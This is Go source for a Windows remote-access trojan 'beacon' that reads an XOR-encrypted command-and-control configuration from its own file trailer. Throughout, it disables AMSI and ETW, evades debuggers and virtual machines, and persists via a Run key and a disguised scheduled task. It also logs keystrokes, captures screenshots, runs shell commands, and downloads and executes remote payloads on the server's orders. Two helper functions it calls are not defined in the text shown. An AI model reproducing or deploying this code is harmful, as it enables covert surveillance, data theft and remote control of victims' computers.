// Windows HTTP beacon stub. Wrap attaches a carrier file + config trailer.
// Build: GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -trimpath -ldflags "-H windowsgui -s -w" -o umbra-stub.bin
// Run ONLY in a VM.
package main

import (
	"bytes"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"image"
	"image/jpeg"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

var (
	k32         = syscall.NewLazyDLL("kernel32.dll")
	u32         = syscall.NewLazyDLL("user32.dll")
	a32         = syscall.NewLazyDLL("advapi32.dll")
	ntdll       = syscall.NewLazyDLL("ntdll.dll")
	gdi         = syscall.NewLazyDLL("gdi32.dll")
	pIsDbg      = k32.NewProc("IsDebuggerPresent")
	pChkDbg     = k32.NewProc("CheckRemoteDebuggerPresent")
	pSleep      = k32.NewProc("Sleep")
	pVirtProt   = k32.NewProc("VirtualProtect")
	pGetMod     = k32.NewProc("GetModuleHandleA")
	pGetProc    = k32.NewProc("GetProcAddress")
	pLoadLib    = k32.NewProc("LoadLibraryA")
	pGetUser    = a32.NewProc("GetUserNameA")
	pRegOpen    = a32.NewProc("RegOpenKeyExA")
	pRegSet     = a32.NewProc("RegSetValueExA")
	pRegClose   = a32.NewProc("RegCloseKey")
	pAsyncKey   = u32.NewProc("GetAsyncKeyState")
	pNtQip      = ntdll.NewProc("NtQueryInformationProcess")
	pEtwWrite   = ntdll.NewProc("EtwEventWrite")
	pFreeCon    = k32.NewProc("FreeConsole")
	pGetConWnd  = k32.NewProc("GetConsoleWindow")
	pShowWnd    = u32.NewProc("ShowWindow")
	pGetDC      = u32.NewProc("GetDC")
	pReleaseDC  = u32.NewProc("ReleaseDC")
	pGetSysM    = u32.NewProc("GetSystemMetrics")
	pCreateCDC  = gdi.NewProc("CreateCompatibleDC")
	pCreateCB   = gdi.NewProc("CreateCompatibleBitmap")
	pSelectObj  = gdi.NewProc("SelectObject")
	pBitBlt     = gdi.NewProc("BitBlt")
	pGetDIBits  = gdi.NewProc("GetDIBits")
	pDeleteDC   = gdi.NewProc("DeleteDC")
	pDeleteObj  = gdi.NewProc("DeleteObject")
	pCreateTool = k32.NewProc("CreateToolhelp32Snapshot")
	pProc32F    = k32.NewProc("Process32FirstW")
	pProc32N    = k32.NewProc("Process32NextW")
	pCloseH     = k32.NewProc("CloseHandle")
)

const (
	keyXOR      = 0x5A
	cfgWindow   = 8192
	hkcu        = uintptr(0x80000001)
	keySetVal   = 0x0002
	keyQuery    = 0x0001
	regSz       = 1
	swHide      = 0
	srcCopy     = 0x00CC0020
	createNoWin = 0x08000000
)

type beaconResp struct {
	Status string `json:"status"`
	Tasks  []struct {
		ID      string `json:"id"`
		Command string `json:"command"`
		Args    string `json:"args"`
	} `json:"tasks"`
}

func cfgMagic() []byte {
	return []byte{0x61, 0x72, 0x67, 0x70, 0x01, 0x70, 0x75, 0x74}
}

func fileMagic() []byte {
	enc := []byte{0x69, 0x71, 0x7E, 0x6E, 0x7D, 0x7A, 0x0D, 0x3C}
	out := make([]byte, 8)
	for i, b := range enc {
		out[i] = b ^ 0x3C
	}
	return out
}

func hideConsole() {
	pFreeCon.Call()
	hwnd, _, _ := pGetConWnd.Call()
	if hwnd != 0 {
		pShowWnd.Call(hwnd, swHide)
	}
}

func patchRet(addr uintptr) {
	if addr == 0 {
		return
	}
	var old uint32
	pVirtProt.Call(addr, 16, 0x40, uintptr(unsafe.Pointer(&old)))
	patch := []byte{0x31, 0xC0, 0xC3}
	for i, b := range patch {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = b
	}
	pVirtProt.Call(addr, 16, uintptr(old), uintptr(unsafe.Pointer(&old)))
}

func patchAMSI() {
	pLoadLib.Call(uintptr(unsafe.Pointer(&[]byte("amsi.dll\x00")[0])))
	h, _, _ := pGetMod.Call(uintptr(unsafe.Pointer(&[]byte("amsi.dll\x00")[0])))
	if h == 0 {
		return
	}
	for _, name := range []string{"AmsiScanBuffer\x00", "AmsiScanString\x00"} {
		n := []byte(name)
		a, _, _ := pGetProc.Call(h, uintptr(unsafe.Pointer(&n[0])))
		patchRet(a)
	}
}

func patchETW() {
	if pEtwWrite.Find() == nil && pEtwWrite.Addr() != 0 {
		patchRet(pEtwWrite.Addr())
	}
}

func isDebugger() bool {
	r, _, _ := pIsDbg.Call()
	if r != 0 {
		return true
	}
	var d int32
	proc, _ := syscall.GetCurrentProcess()
	pChkDbg.Call(uintptr(proc), uintptr(unsafe.Pointer(&d)))
	if d != 0 {
		return true
	}
	var port uintptr
	pNtQip.Call(uintptr(proc), 7, uintptr(unsafe.Pointer(&port)), unsafe.Sizeof(port), 0)
	return port != 0
}

func isVM() bool {
	keys := []string{
		"SYSTEM\\CurrentControlSet\\Services\\VBoxGuest",
		"SYSTEM\\CurrentControlSet\\Services\\VBoxMouse",
		"SYSTEM\\CurrentControlSet\\Services\\vmci",
		"SYSTEM\\CurrentControlSet\\Services\\vmhgfs",
		"SYSTEM\\CurrentControlSet\\Services\\vmmouse",
		"HARDWARE\\ACPI\\DSDT\\VBOX__",
		"HARDWARE\\ACPI\\DSDT\\VMware",
		"HARDWARE\\ACPI\\DSDT\\QEMU",
	}
	for _, k := range keys {
		var h uintptr
		kb := append([]byte(k), 0)
		r, _, _ := pRegOpen.Call(uintptr(0x80000002), uintptr(unsafe.Pointer(&kb[0])), 0, keyQuery, uintptr(unsafe.Pointer(&h)))
		if r == 0 {
			pRegClose.Call(h)
			return true
		}
	}
	host, _ := os.Hostname()
	hl := strings.ToLower(host)
	for _, n := range []string{"virtualbox", "vmware", "qemu", "hyperv", "vbox"} {
		if strings.Contains(hl, n) {
			return true
		}
	}
	return false
}

func persist(exe string) {
	// Drop a stable copy under LOCALAPPDATA so the Run key survives the user
	// deleting the originally-executed file; copy carries the same config trailer.
	stable := exe
	if dir := os.Getenv("LOCALAPPDATA"); dir != "" {
		dir = filepath.Join(dir, "Microsoft", "CompatCache")
		if os.MkdirAll(dir, 0755) == nil {
			dst := filepath.Join(dir, "CompatCache.exe")
			if _, err := os.Stat(dst); err == nil {
				stable = dst
			} else if data, err := os.ReadFile(exe); err == nil {
				if os.WriteFile(dst, data, 0755) == nil {
					stable = dst
				}
			}
		}
	}
	path := []byte("Software\\Microsoft\\Windows\\CurrentVersion\\Run\x00")
	var h uintptr
	r, _, _ := pRegOpen.Call(hkcu, uintptr(unsafe.Pointer(&path[0])), 0, keySetVal, uintptr(unsafe.Pointer(&h)))
	if r != 0 {
		return
	}
	defer pRegClose.Call(h)
	name := []byte("AppCache\x00")
	val := append([]byte(`"`+stable+`"`), 0)
	pRegSet.Call(h, uintptr(unsafe.Pointer(&name[0])), 0, regSz, uintptr(unsafe.Pointer(&val[0])), uintptr(len(val)))
	cmd := exec.Command("schtasks", "/Create", "/F", "/TN", "Microsoft\\Windows\\AppCache", "/SC", "ONLOGON", "/TR", `"`+stable+`"`, "/RL", "LIMITED")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: createNoWin}
	_ = cmd.Run()
}

func readSelf() ([]byte, error) {
	p, err := os.Executable()
	if err != nil {
		return nil, err
	}
	return os.ReadFile(p)
}

func decryptCfg(buf []byte) map[string]string {
	n := len(buf)
	if n < 12 {
		return nil
	}
	magic := cfgMagic()
	window := cfgWindow
	if window > n {
		window = n
	}
	idx := -1
	for off := 8; off <= window; off++ {
		i := n - off
		if i+12 > n {
			continue
		}
		if bytes.Equal(buf[i:i+8], magic) {
			idx = i
			break
		}
	}
	if idx < 0 {
		return nil
	}
	ln := int(binary.LittleEndian.Uint32(buf[idx+8 : idx+12]))
	if ln <= 0 || ln > 8192 || idx+12+ln > n {
		return nil
	}
	js := make([]byte, ln)
	for i := 0; i < ln; i++ {
		js[i] = buf[idx+12+i] ^ byte(keyXOR+(12+i))
	}
	out := map[string]string{}
	if err := json.Unmarshal(js, &out); err != nil {
		return nil
	}
	return out
}

func extractCarrier(buf []byte) []byte {
	magic := fileMagic()
	n := len(buf)
	cfg := cfgMagic()
	end := n
	window := cfgWindow
	if window > n {
		window = n
	}
	for off := 8; off <= window; off++ {
		i := n - off
		if i+12 > n {
			continue
		}
		if bytes.Equal(buf[i:i+8], cfg) {
			end = i
			break
		}
	}
	for i := 0; i+12 <= end; i++ {
		if bytes.Equal(buf[i:i+8], magic) {
			ln := int(binary.LittleEndian.Uint32(buf[i+8 : i+12]))
			if ln > 0 && i+12+ln <= end {
				c := make([]byte, ln)
				copy(c, buf[i+12:i+12+ln])
				return c
			}
		}
	}
	return nil
}

func tf(m map[string]string, k string) bool {
	v := strings.ToLower(strings.TrimSpace(m[k]))
	return v == "true" || v == "1" || v == "yes"
}

func hiddenCmd(name string, args ...string) *exec.Cmd {
	cmd := exec.Command(name, args...)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: createNoWin}
	return cmd
}

func dropCarrier(data []byte, method string, ppid bool) {
	if len(data) < 2 {
		return
	}
	dir := filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "Windows", "INetCache")
	_ = os.MkdirAll(dir, 0755)
	name := fmt.Sprintf("CompatCache-%08x.exe", uint32(time.Now().UnixNano()))
	path := filepath.Join(dir, name)
	if err := os.WriteFile(path, data, 0644); err != nil {
		dir = os.TempDir()
		path = filepath.Join(dir, name)
		if err := os.WriteFile(path, data, 0644); err != nil {
			return
		}
	}
	if method != "" && method != "none" {
		if launchInjected(path, method, ppid) {
			return
		}
	}
	cmd := hiddenCmd(path)
	_ = cmd.Start()
}

func hwid() string {
	host, _ := os.Hostname()
	user := os.Getenv("USERNAME")
	sum := sha256.Sum256([]byte(host + "\\" + user + "|umbra"))
	return fmt.Sprintf("%X", sum[:8])
}

func username() string {
	buf := make([]byte, 256)
	n := uint32(len(buf))
	pGetUser.Call(uintptr(unsafe.Pointer(&buf[0])), uintptr(unsafe.Pointer(&n)))
	s := strings.TrimRight(string(buf[:n]), "\x00")
	if s == "" {
		s = os.Getenv("USERNAME")
	}
	return s
}

func httpDo(host, port, path, body string, useTLS bool) []byte {
	if host == "" {
		return nil
	}
	scheme := "http"
	if useTLS || port == "443" {
		scheme = "https"
		useTLS = true
	}
	if port == "" {
		if useTLS {
			port = "443"
		} else {
			port = "80"
		}
	}
	origin := fmt.Sprintf("%s://%s", scheme, host)
	if !((useTLS && (port == "443" || port == "")) || (!useTLS && (port == "80" || port == ""))) {
		origin = fmt.Sprintf("%s://%s:%s", scheme, host, port)
	}
	url := origin + path
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12},
		DialContext:     (&net.Dialer{Timeout: 15 * time.Second}).DialContext,
	}
	cli := &http.Client{Timeout: 40 * time.Second, Transport: tr}
	req, err := http.NewRequest(http.MethodPost, url, strings.NewReader(body))
	if err != nil {
		return nil
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	resp, err := cli.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 8<<20))
	return b
}

func keylogTick() string {
	var b strings.Builder
	for vk := 8; vk < 256; vk++ {
		r, _, _ := pAsyncKey.Call(uintptr(vk))
		if r&1 != 0 {
			fmt.Fprintf(&b, "%02X", vk)
			if b.Len() > 900 {
				break
			}
		}
	}
	return b.String()
}

func atoiDef(s string, d int) int {
	n := 0
	for _, c := range s {
		if c < '0' || c > '9' {
			if n == 0 {
				return d
			}
			break
		}
		n = n*10 + int(c-'0')
	}
	if n == 0 && s != "0" {
		return d
	}
	return n
}

func sleepObf(ms int, on bool) {
	if ms < 1000 {
		ms = 1000
	}
	if !on {
		pSleep.Call(uintptr(ms))
		return
	}
	buf := make([]byte, 4096)
	for i := range buf {
		buf[i] = byte(i * 37)
	}
	pSleep.Call(uintptr(ms))
	for i := range buf {
		buf[i] ^= 0xA5
	}
	runtime.KeepAlive(buf)
}

func runShell(cmdline string) (string, int) {
	if strings.TrimSpace(cmdline) == "" {
		return "", 1
	}
	cmd := hiddenCmd("cmd.exe", "/C", cmdline)
	out, err := cmd.CombinedOutput()
	code := 0
	if err != nil {
		code = 1
	}
	s := string(out)
	if len(s) > 200000 {
		s = s[:200000]
	}
	return s, code
}

func screenshotJPEG() (string, int) {
	w, _, _ := pGetSysM.Call(0)
	h, _, _ := pGetSysM.Call(1)
	if w == 0 || h == 0 {
		return "no desktop", 1
	}
	hdc, _, _ := pGetDC.Call(0)
	if hdc == 0 {
		return "no dc", 1
	}
	defer pReleaseDC.Call(0, hdc)
	mdc, _, _ := pCreateCDC.Call(hdc)
	bmp, _, _ := pCreateCB.Call(hdc, w, h)
	old, _, _ := pSelectObj.Call(mdc, bmp)
	pBitBlt.Call(mdc, 0, 0, w, h, hdc, 0, 0, srcCopy)

	type bmih struct {
		Size, Width, Height                                         int32
		Planes, BitCount                                            uint16
		Compression, SizeImage, XPels, YPels, ClrUsed, ClrImportant uint32
	}
	hdr := bmih{Size: 40, Width: int32(w), Height: -int32(h), Planes: 1, BitCount: 32}
	buf := make([]byte, int(w*h*4))
	pGetDIBits.Call(mdc, bmp, 0, h, uintptr(unsafe.Pointer(&buf[0])), uintptr(unsafe.Pointer(&hdr)), 0)
	pSelectObj.Call(mdc, old)
	pDeleteObj.Call(bmp)
	pDeleteDC.Call(mdc)

	img := image.NewRGBA(image.Rect(0, 0, int(w), int(h)))
	copy(img.Pix, buf)
	var enc bytes.Buffer
	if err := jpeg.Encode(&enc, img, &jpeg.Options{Quality: 60}); err != nil {
		return err.Error(), 1
	}
	return base64.StdEncoding.EncodeToString(enc.Bytes()), 0
}

func processList() (string, int) {
	type pe32 struct {
		Size            uint32
		CntUsage        uint32
		ProcessID       uint32
		DefaultHeapID   uintptr
		ModuleID        uint32
		Threads         uint32
		ParentProcessID uint32
		PriClassBase    int32
		Flags           uint32
		ExeFile         [260]uint16
	}
	snap, _, _ := pCreateTool.Call(0x00000002, 0)
	if snap == 0 || snap == uintptr(^uint(0)) {
		return "snapshot failed", 1
	}
	defer pCloseH.Call(snap)
	var e pe32
	e.Size = uint32(unsafe.Sizeof(e))
	ok, _, _ := pProc32F.Call(snap, uintptr(unsafe.Pointer(&e)))
	var b strings.Builder
	for ok != 0 {
		name := syscall.UTF16ToString(e.ExeFile[:])
		fmt.Fprintf(&b, "%d\t%d\t%s\n", e.ProcessID, e.ParentProcessID, name)
		ok, _, _ = pProc32N.Call(snap, uintptr(unsafe.Pointer(&e)))
		if b.Len() > 100000 {
			break
		}
	}
	return b.String(), 0
}

func parseCmd(raw string) string {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return ""
	}
	var s string
	if json.Unmarshal([]byte(raw), &s) == nil {
		return s
	}
	return strings.Trim(raw, "\"")
}

func parseArgs(raw string) map[string]any {
	out := map[string]any{}
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return out
	}
	_ = json.Unmarshal([]byte(raw), &out)
	return out
}

func argStr(m map[string]any, keys ...string) string {
	for _, k := range keys {
		if v, ok := m[k]; ok {
			switch t := v.(type) {
			case string:
				return t
			case float64:
				return fmt.Sprintf("%v", t)
			}
		}
	}
	return ""
}

func runTask(tID, command, argsJSON, host, port string, useTLS bool, hwid string, sleepS *int) {
	cmd := parseCmd(command)
	args := parseArgs(argsJSON)
	out := ""
	code := 0
	switch strings.ToLower(cmd) {
	case "shell":
		out, code = runShell(argStr(args, "cmd", "command", "Cmd"))
	case "screenshot":
		out, code = screenshotJPEG()
	case "sleep":
		n := atoiDef(argStr(args, "seconds", "Seconds"), 15)
		if n < 5 {
			n = 5
		}
		*sleepS = n
		out = fmt.Sprintf("sleep=%d", n)
	case "uninstall":
		exe, _ := os.Executable()
		hiddenCmd("cmd.exe", "/C", "timeout /t 2 /nobreak >nul & del /f /q \""+exe+"\"").Start()
		os.Exit(0)
	case "persist":
		exe, _ := os.Executable()
		persist(exe)
		out = "persist ok"
	case "get_processes":
		out, code = processList()
	case "download_exec":
		u := argStr(args, "url", "URL")
		if u == "" {
			out, code = "no url", 1
			break
		}
		resp, err := http.Get(u)
		if err != nil {
			out, code = err.Error(), 1
			break
		}
		b, _ := io.ReadAll(io.LimitReader(resp.Body, 40<<20))
		resp.Body.Close()
		p := filepath.Join(os.TempDir(), fmt.Sprintf("cache-%d.exe", time.Now().UnixNano()))
		_ = os.WriteFile(p, b, 0644)
		_ = hiddenCmd(p).Start()
		out = "started " + p
	case "update":
		u := argStr(args, "url", "URL")
		out = "update queued " + u
	default:
		out = "unknown command " + cmd
		code = 1
	}
	body, _ := json.Marshal(map[string]any{
		"type":    "result",
		"hw_id":   hwid,
		"task_id": tID,
		"output":  out,
		"code":    code,
	})
	httpDo(host, port, "/beacon", string(body), useTLS)
}

func injectSelf(method string, ppid bool) {
	if method == "" || method == "none" {
		return
	}
	exe, err := os.Executable()
	if err != nil || exe == "" {
		return
	}
	_ = launchInjected(exe, method, ppid)
}

func main() {
	hideConsole()
	exe, _ := os.Executable()
	raw, err := readSelf()
	if err != nil || len(raw) < 64 {
		return
	}
	cfg := decryptCfg(raw)
	if cfg == nil || cfg["c2_host"] == "" {
		return
	}
	if tf(cfg, "hide_console") {
		hideConsole()
	}
	host := cfg["c2_host"]
	port := cfg["c2_port"]
	useTLS := tf(cfg, "use_tls") || port == "443"
	if port == "" {
		if useTLS {
			port = "443"
		} else {
			port = "80"
		}
	}
	sleepS := atoiDef(cfg["sleep_interval"], 15)
	jit := atoiDef(cfg["jitter"], 20)
	if sleepS < 5 {
		sleepS = 5
	}
	if tf(cfg, "anti_debug") && isDebugger() {
		return
	}
	if tf(cfg, "anti_vm") && isVM() {
		return
	}
	if cfg["amsi_bypass"] != "false" {
		patchAMSI()
	}
	if cfg["etw_patch"] != "false" {
		patchETW()
	}
	if tf(cfg, "dll_unhook") {
		unhookNtdll()
	}
	if tf(cfg, "persistence") {
		persist(exe)
	}
	inj := cfg["injection_method"]
	ppid := tf(cfg, "ppid_spoof")
	injectSelf(inj, ppid)
	if c := extractCarrier(raw); len(c) > 0 {
		go dropCarrier(c, inj, ppid)
	}

	hostn, _ := os.Hostname()
	user := username()
	id := hwid()
	pid := os.Getpid()
	admin := 0
	if f, err := os.Open("\\\\.\\PHYSICALDRIVE0"); err == nil {
		admin = 1
		f.Close()
	}
	reg, _ := json.Marshal(map[string]any{
		"type":          "register",
		"hostname":      hostn,
		"username":      user,
		"os_version":    "Windows",
		"arch":          "x64",
		"pid":           pid,
		"privileges":    admin,
		"hw_id":         id,
		"build_version": 4,
		"capabilities":  []string{"shell", "keylog", "screenshot", "persist", "processes", "wrap"},
	})
	obf := tf(cfg, "sleep_obfuscation") || tf(cfg, "heap_encrypt")
	httpDo(host, port, "/agent", string(reg), useTLS)

	for {
		delay := sleepS*1000 + (int(time.Now().UnixNano()%int64(jit*20+1)) - jit*10)
		if delay < 4000 {
			delay = 4000
		}
		sleepObf(delay, obf)
		httpDo(host, port, "/agent", string(reg), useTLS)
		keys := keylogTick()
		typ := "heartbeat"
		data := keys
		if keys != "" {
			typ = "keystrokes"
		}
		payload := fmt.Sprintf(`{"type":"%s","hw_id":"%s","data":"%s"}`, typ, id, data)
		resp := httpDo(host, port, "/beacon", payload, useTLS)
		var br beaconResp
		if len(resp) > 0 && json.Unmarshal(resp, &br) == nil {
			for _, t := range br.Tasks {
				runTask(t.ID, t.Command, t.Args, host, port, useTLS, id, &sleepS)
			}
		}
	}
}
